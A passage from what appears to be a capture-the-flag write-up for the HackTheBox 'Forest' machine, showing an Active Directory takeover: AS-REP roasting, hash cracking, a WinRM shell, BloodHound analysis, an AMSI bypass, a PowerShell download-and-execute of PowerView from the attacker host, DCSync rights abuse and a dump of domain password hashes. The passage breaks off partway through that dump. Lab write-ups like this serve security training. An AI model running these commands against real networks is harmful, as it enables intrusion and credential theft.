</pre></table></code></div></div><p>Using <code class="language-plaintext highlighter-rouge">rpclient</code>, we’ve been able to enumerate a list of usernames and what seems to be a service name:</p><ul><li>andy (Andy Hislip)</li><li>lucinda (Lucinda Berger)</li><li>mark (Mark Brandt)</li><li>santi (Santi Rodriguez)</li><li>sebastien (Sebastien Caron)</li><li>svc-alfresco</li></ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/htb/machines/windows/easy/forest/grep_ldap_anon.png" alt="" /></p><blockquote><p><strong>Note:</strong> <code class="language-plaintext highlighter-rouge">enum4linux</code> could also be used to enumerate usernames and password policy.</p></blockquote><h3 id="kerberos-port-88">Kerberos (port 88)</h3><p>We can confirm that usernames discovered earlier exist using <code class="language-plaintext highlighter-rouge">kerbrute</code>:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>./kerbrute userenum --dc htb.local -d htb.local User.txt
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/htb/machines/windows/easy/forest/kerbrute.png" alt="" /></p><p>Looking at <a href="https://docs.alfresco.com/process-services/latest/config/authenticate/">alfresco documentation</a>, we can see that it requires <strong>Kerberos pre-authentication to be disabled</strong>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/htb/machines/windows/easy/forest/krb_preauth_disable.png" alt="" /></p><p>This will allow us to perform <strong>AS-REP Roasting</strong>:</p><ul><li>sending a dummy request to the Key Distribution Center (<strong>KDC</strong>)</li><li>getting a <strong>TGT</strong> (Ticket Granting Ticket) which contains material encrypted with the user’s password hash</li><li>trying to crack the password with an offline bruteforce attack</li></ul><blockquote><p>Unlike <strong>Kerberoasting</strong> these users do not necessary have to be service accounts.</p></blockquote><hr /><h2 id="foothold">Foothold</h2><h3 id="as-rep-roasting-with-getnpuserspy-impacket">AS-REP Roasting with <code class="language-plaintext highlighter-rouge">GetNPUsers.py</code> (impacket)</h3><p><code class="language-plaintext highlighter-rouge">GetNPUsers.py</code> from <a href="https://github.com/SecureAuthCorp/impacket"><strong>impacket</strong></a> can be used to request a <strong>TGT</strong> (Ticket Granting Ticket), getting both the vulnerable usernames and their corresponding <code class="language-plaintext highlighter-rouge">krbasrep5</code> hashes directly:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nv">$ </span>GetNPUsers.py htb.local/ <span class="nt">-dc-ip</span> <span class="nv">$TARGET</span> <span class="nt">-request</span> <span class="c"># we could add '-format hashcat'</span>
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
<span class="nt">------------</span>  <span class="nt">------------------------------------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------</span>
svc-alfresco  <span class="nv">CN</span><span class="o">=</span>Service Accounts,OU<span class="o">=</span>Security Groups,DC<span class="o">=</span>htb,DC<span class="o">=</span><span class="nb">local  </span>2021-08-17 22:07:11.322568  2021-08-17 21:52:25.008334  0x410200 



<span class="nv">$krb5asrep$23$svc</span><span class="nt">-alfresco</span>@HTB.LOCAL:1ab93db0067516ce979a1a21bfad456a<span class="nv">$89bf43129d73d2b85bb939d9dc5f11533e80b53b6c86f5fe0d86ddf531fc380b77abbdbc4ebc77bc2f1ad94dc49a308c5f8aa74d885386ffbefdb25d4f201798c0acaf383ce79ed4afaf921994f37d06a2be1515cd28d78d13f8bb3219776071f373107c1605646cd11bbe65f87476c41ae90e4fd098188f680382626603c234dfd8f6432b9d5f31f86aba0ac025ca6ec77cf9434cbfb33a92d5e99295e457351e3d0947a7ea59f53f7d31be8957bbb34930aac943c55a09020970677c62f9283c57045e5ca1cc7e5730651cea7e46a257e44771abfde9fc179f635b5d5c65c08612e420c703</span>
</pre></table></code></div></div><h3 id="crack-the-clear-text-password-of-the-service-account-with-john">Crack the clear text password of the service account with <code class="language-plaintext highlighter-rouge">john</code></h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:01 DONE (2021-08-17 22:29) 0.6622g/s 2705Kp/s 2705Kc/s 2705KC/s s64891817..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">s3rvice</code> is <code class="language-plaintext highlighter-rouge">svc-alfresco</code>’s password.</p><h3 id="shell-over-winrm">Shell over WinRM</h3><p>Port 5985 is open so maybe we can login remotely over <strong>WinRM</strong> with these credentials.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>evil-winrm <span class="nt">-i</span> <span class="nv">$TARGET</span> <span class="nt">-u</span> svc-alfresco <span class="nt">-p</span> s3rvice
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/htb/machines/windows/easy/forest/shell.png" alt="" /></p><hr /><h2 id="privilege-escalation">Privilege escalation</h2><h3 id="local-enumeration-with-winpeas">Local enumeration with <code class="language-plaintext highlighter-rouge">winPEAS</code></h3><p>In order to transfer <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS"><code class="language-plaintext highlighter-rouge">winPEAS.exe</code></a> we can host an SMB server on our machine using <strong>impacket</strong> again:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali <span class="nb">.</span>
</pre></table></code></div></div><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc-alfresco\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">copy</span><span class="w"> </span><span class="nx">\\10.10.14.12\kali\winPEASx64.exe</span><span class="w"> </span><span class="o">.</span><span class="w">
</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc-alfresco\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">dir</span><span class="w">


    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\Users\svc-alfresco\Desktop</span><span class="w">


</span><span class="n">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">
</span><span class="nt">-ar</span><span class="o">---</span><span class="w">        </span><span class="mi">9</span><span class="n">/23/2019</span><span class="w">   </span><span class="nx">2:16</span><span class="w"> </span><span class="nx">PM</span><span class="w">             </span><span class="nx">32</span><span class="w"> </span><span class="nx">user.txt</span><span class="w">
</span><span class="nt">-a</span><span class="o">----</span><span class="w">        </span><span class="mi">8</span><span class="n">/17/2021</span><span class="w">   </span><span class="nx">3:36</span><span class="w"> </span><span class="nx">PM</span><span class="w">        </span><span class="nx">1920000</span><span class="w"> </span><span class="nx">winPEASx64.exe</span><span class="w">
</span></pre></table></code></div></div><p>At this point, I didn’t find anything exploitable from winPEAS output.</p><h3 id="exploring-exploitable-paths-with-bloodhound">Exploring exploitable paths with <code class="language-plaintext highlighter-rouge">BloodHound</code></h3><p>As it is a Domain Controller, we can also use <a href="https://github.com/BloodHoundAD/BloodHound#about-bloodhound">BloodHound</a> to visualize the domain and see if there are potential privilege escalation paths.</p><h4 id="method-1-using-sharphound">Method #1: using <code class="language-plaintext highlighter-rouge">SharpHound</code></h4><ol><li><p>On our attacker machine, we have to download <a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe">SharpHound.exe</a>:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> <span class="nv">$ </span>wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe
</pre></table></code></div></div></li><li><p>Then we can transfer it the same way we did for <strong>winPEAS</strong> (using <strong>impacket</strong> <code class="language-plaintext highlighter-rouge">smbserver.py</code>)</p></li><li><p>After executing it we’ll have a zip file that we can transfer once again with our SMB server and then upload it to the <strong>BloodHound</strong> web app:</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="w"> </span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc-alfresco\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\SharpHound.exe</span><span class="w">
 </span><span class="o">----------------------------------------------</span><span class="w">
 </span><span class="n">Initializing</span><span class="w"> </span><span class="nx">SharpHound</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">5:34</span><span class="w"> </span><span class="nx">AM</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">9/6/2021</span><span class="w">
 </span><span class="o">----------------------------------------------</span><span class="w">

 </span><span class="n">Resolved</span><span class="w"> </span><span class="nx">Collection</span><span class="w"> </span><span class="nx">Methods:</span><span class="w"> </span><span class="nx">Group</span><span class="p">,</span><span class="w"> </span><span class="nx">Sessions</span><span class="p">,</span><span class="w"> </span><span class="nx">Trusts</span><span class="p">,</span><span class="w"> </span><span class="nx">ACL</span><span class="p">,</span><span class="w"> </span><span class="nx">ObjectProps</span><span class="p">,</span><span class="w"> </span><span class="nx">LocalGroups</span><span class="p">,</span><span class="w"> </span><span class="nx">SPNTargets</span><span class="p">,</span><span class="w"> </span><span class="nx">Container</span><span class="w">

 </span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Creating</span><span class="w"> </span><span class="nx">Schema</span><span class="w"> </span><span class="nx">map</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">domain</span><span class="w"> </span><span class="nx">HTB.LOCAL</span><span class="w"> </span><span class="nx">using</span><span class="w"> </span><span class="nx">path</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Schema</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="kr">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">htb</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">local</span><span class="w">
 </span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="nx">Cache</span><span class="w"> </span><span class="nx">File</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">Found:</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nx">Objects</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">cache</span><span class="w">

 </span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Pre-populating</span><span class="w"> </span><span class="nx">Domain</span><span class="w"> </span><span class="nx">Controller</span><span class="w"> </span><span class="nx">SIDS</span><span class="w">
 </span><span class="n">Status:</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nx">objects</span><span class="w"> </span><span class="nx">finished</span><span class="w"> </span><span class="p">(</span><span class="o">+</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="kr">Using</span><span class="w"> </span><span class="mi">21</span><span class="w"> </span><span class="n">MB</span><span class="w"> </span><span class="nx">RAM</span><span class="w">
 </span><span class="n">Status:</span><span class="w"> </span><span class="nx">123</span><span class="w"> </span><span class="nx">objects</span><span class="w"> </span><span class="nx">finished</span><span class="w"> </span><span class="p">(</span><span class="o">+</span><span class="mi">123</span><span class="w"> </span><span class="mf">61.5</span><span class="p">)</span><span class="n">/s</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="nx">Using</span><span class="w"> </span><span class="nx">28</span><span class="w"> </span><span class="nx">MB</span><span class="w"> </span><span class="nx">RAM</span><span class="w">
 </span><span class="n">Enumeration</span><span class="w"> </span><span class="nx">finished</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">00:00:02.3907594</span><span class="w">
 </span><span class="n">Compressing</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="o">.</span><span class="nx">\20210906053417_BloodHound.zip</span><span class="w">
 </span><span class="n">You</span><span class="w"> </span><span class="nx">can</span><span class="w"> </span><span class="nx">upload</span><span class="w"> </span><span class="nx">this</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">directly</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">UI</span><span class="w">

 </span><span class="n">SharpHound</span><span class="w"> </span><span class="nx">Enumeration</span><span class="w"> </span><span class="nx">Completed</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">5:34</span><span class="w"> </span><span class="nx">AM</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">9/6/2021</span><span class="o">!</span><span class="w"> </span><span class="nx">Happy</span><span class="w"> </span><span class="nx">Graphing</span><span class="o">!</span><span class="w">
 </span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc-alfresco\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">copy</span><span class="w"> </span><span class="o">.</span><span class="nx">\20210906053417_BloodHound.zip</span><span class="w"> </span><span class="nx">\\10.10.14.12\kali\20210906053417_BloodHound.zip</span><span class="w">
</span></pre></table></code></div></div><blockquote><p>Another way to transfer the zip file is to encode it in base64 using <code class="language-plaintext highlighter-rouge">certutil -encode 20210906053417_BloodHound.zip loot.txt</code></p></blockquote></li><li><p>In order to run <strong>BloodHound</strong> on our attacker machine, we have to run these commands:</p></li></ol><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c"># Open a terminal and type the following:</span>
<span class="nv">$ </span>neo4j console <span class="c"># default credentials -&gt; neo4j:neo4j</span>
<span class="c"># In another terminal, open bloodhound:</span>
<span class="nv">$ </span>bloodhound
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/htb/machines/windows/easy/forest/bloodhound.png" alt="Bloodhound" /></p><h4 id="method-2-using-bloodhound-python">Method #2: using <code class="language-plaintext highlighter-rouge">bloodhound-python</code></h4><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="nv">$ </span>pip <span class="nb">install </span>bloodhound 
<span class="nv">$ </span>bloodhound-python <span class="nt">-d</span> htb.local <span class="nt">-u</span> svc-alfresco <span class="nt">-p</span> s3rvice <span class="nt">-c</span> all <span class="nt">-ns</span> <span class="nv">$TARGET</span>
INFO: Found AD domain: htb.local
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 1 domains
INFO: Found 1 domains <span class="k">in </span>the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
WARNING: Could not resolve SID: S-1-5-21-3072663084-364016917-1341370565-1153
INFO: Found 31 <span class="nb">users
</span>INFO: Found 75 <span class="nb">groups
</span>INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
INFO: Done <span class="k">in </span>00M 40S
<span class="nv">$ </span><span class="nb">ls</span> <span class="k">*</span>.json
20210906143955_computers.json  20210906143955_domains.json  20210906143955_groups.json  20210906143955_users.json
</pre></table></code></div></div><p>This is the easiest way! These JSON files can be directly uploaded to the <strong>BloodHound</strong> GUI.</p><h4 id="finding-an-ad-attack-path">Finding an AD Attack Path</h4><ol><li><p>First, we have to mark <code class="language-plaintext highlighter-rouge">svc-alfresco</code> as owned:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/htb/machines/windows/easy/forest/mark_owned_user.png" alt="" /></p></li><li><p>Then, we can click on <code class="language-plaintext highlighter-rouge">Shortest Path from Owned Principals</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/htb/machines/windows/easy/forest/shortest_path_from_owned_prinicipals.png" alt="" /></p></li></ol><p>As we can see on the screenshot above, <code class="language-plaintext highlighter-rouge">svc-alfresco</code> is a member of <strong>Service Accounts</strong> which is a member of <strong>Privileged IT Accounts</strong> which is a member of the very special group <strong>Account Operators</strong>.</p><p>Members of this group are allowed create and modify users and add them to non-protected groups. [Read <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators">Microsoft documentation</a>]</p><p>Now if we click on <code class="language-plaintext highlighter-rouge">Shortest Paths to High Value Targets</code>, <strong>Bloodhound</strong> will reveal another graph:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/htb/machines/windows/easy/forest/high_value_targets.png" alt="" /></p><ul><li><p>The <strong>Account Operators</strong> group has <code class="language-plaintext highlighter-rouge">GenericAll</code> permissions on the <strong>Exchange Windows Permissions</strong> group.</p></li><li><p>The <strong>Exchange Windows Permissions</strong> group has <code class="language-plaintext highlighter-rouge">WriteDacl</code> privileges on the Domain. The <code class="language-plaintext highlighter-rouge">WriteDACL</code> privilege gives a user the ability to add <strong>DACLs</strong> ( Discretionary Access Control List) to an object.</p></li></ul><p>This means that:</p><ol><li><p>We can add users to the <strong>Exchange Windows Permissions</strong> group (thanks to the <code class="language-plaintext highlighter-rouge">GenericAll</code> permission)</p></li><li><p>Then, since the Exchange group has <code class="language-plaintext highlighter-rouge">WriteDacl</code> permission, we can give <strong>DCSync</strong> privileges to the users we created.</p></li></ol><blockquote><p>The <code class="language-plaintext highlighter-rouge">DCSync</code> privilege will give us the right to <u>perform a domain synchronization and finally dump all the password hashes</u>!</p></blockquote><h3 id="dcsync">DCSYNC</h3><ol><li><p>Add a user to the domain:</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="w"> </span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc-alfresco\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">amirr0r</span><span class="w"> </span><span class="nx">password1234</span><span class="w"> </span><span class="nx">/add</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
 </span><span class="n">The</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="nx">completed</span><span class="w"> </span><span class="nx">successfully.</span><span class="w">
</span></pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/htb/machines/windows/easy/forest/amirr0r.png" alt="" /></p></li><li><p>Add this user to the <strong>Excange Windows Permissions</strong> group:</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="w"> </span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc-alfresco\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="s2">"Exchange Windows Permissions"</span><span class="w"> </span><span class="nx">/add</span><span class="w"> </span><span class="nx">amirr0r</span><span class="w">
 </span><span class="n">The</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="nx">completed</span><span class="w"> </span><span class="nx">successfully.</span><span class="w">
</span></pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/htb/machines/windows/easy/forest/net_user.png" alt="" /></p></li><li><p>Grant this user the <code class="language-plaintext highlighter-rouge">DCSync</code> privileges using <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"><code class="language-plaintext highlighter-rouge">PowerView.ps1</code></a>:</p><blockquote><p>These information can be found via <code class="language-plaintext highlighter-rouge">Help &gt; Abuse info</code> by right-clicking on <code class="language-plaintext highlighter-rouge">WriteDacl</code> in <strong>BloodHound</strong></p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/htb/machines/windows/easy/forest/help.png" alt="" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/htb/machines/windows/easy/forest/abuse_info.png" alt="" /></p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="w"> </span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc-alfresco\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">menu</span><span class="w">
 </span><span class="o">...</span><span class="w">
 </span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Bypass-4MSI</span><span class="w">
 </span><span class="o">...</span><span class="w">
 </span><span class="c"># we can disable Defender before importing the script</span><span class="w">
 </span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc-alfresco\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Bypass-4MSI</span><span class="w">
 </span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Patched</span><span class="o">!</span><span class="w"> </span><span class="p">:</span><span class="nx">D</span><span class="w">
 </span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc-alfresco\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">IEX</span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadString</span><span class="p">(</span><span class="s1">'http://10.10.14.12/PowerView.ps1'</span><span class="p">)</span><span class="w">
 </span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc-alfresco\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$SecPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'password1234'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
 </span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc-alfresco\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="p">(</span><span class="s1">'HTB\amirr0r'</span><span class="p">,</span><span class="w"> </span><span class="nv">$SecPassword</span><span class="p">)</span><span class="w">
 </span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc-alfresco\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Add-ObjectAcl</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$cred</span><span class="w"> </span><span class="nt">-TargetIdentity</span><span class="w"> </span><span class="s2">"DC=htb,DC=local"</span><span class="w"> </span><span class="nt">-PrincipalIdentity</span><span class="w"> </span><span class="nx">amirr0r</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">DCSync</span><span class="w">
</span></pre></table></code></div></div></li><li><p>Finally, perform a <strong>DCSync</strong> and extract all the password hashes of all the users on the domain with <strong>impacket</strong> <code class="language-plaintext highlighter-rouge">secretsdump.py</code>:</p></li></ol><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
</pre><td class="rouge-code"><pre><span class="nv">$ </span>/usr/share/doc/python3-impacket/examples/secretsdump.py htb.local/amirr0r:password1234@10.10.10.161
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span>-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
htb.local<span class="se">\A</span>dministrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local<span class="se">\$</span>331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local<span class="se">\S</span>M_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local<span class="se">\S</span>M_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local<span class="se">\S</span>M_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local<span class="se">\S</span>M_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local<span class="se">\S</span>M_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local<span class="se">\S</span>M_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
